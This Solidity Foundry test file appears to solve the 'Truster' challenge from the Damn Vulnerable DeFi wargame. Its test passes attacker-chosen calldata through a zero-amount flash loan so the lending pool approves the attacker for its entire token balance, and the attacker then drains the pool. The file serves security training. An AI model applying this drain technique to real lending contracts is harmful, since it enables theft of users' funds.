// SPDX-License-Identifier: MIT
pragma solidity =0.8.13;

import {TrusterLenderPool} from "../src/damn-vulnerable-defi/contracts/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../src/damn-vulnerable-defi/contracts/DamnValuableToken.sol";
import "forge-std/Test.sol";

contract MaliciousContract is Test {
    TrusterLenderPool pool;
    DamnValuableToken token;

    uint256 million = 1000000e18;

    address alice = vm.addr(1);

    function setUp() public {
        vm.startPrank(alice);
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);

        token.transfer(address(pool), million);
        vm.stopPrank();
    }

    function testVerifyTransfer() public {
        assertEq(token.balanceOf(address(pool)), million);
        assertEq(token.balanceOf(alice), type(uint256).max - million);
    }

    function testMaliciousFlash() public {
        console.log(token.balanceOf(address(pool)));
        console.log(token.balanceOf(address(this)));

        bytes memory data = abi.encodeWithSelector(
            token.approve.selector,
            address(this),
            token.balanceOf(address(pool))
        );

        pool.flashLoan(
            0,
            address(this),
            address(token),
            data
        );

        token.transferFrom(address(pool), address(this), token.balanceOf(address(pool)));

        console.log(token.balanceOf(address(pool)));
        console.log(token.balanceOf(address(this)));

        assertEq(token.balanceOf(address(pool)), 0);
    }
}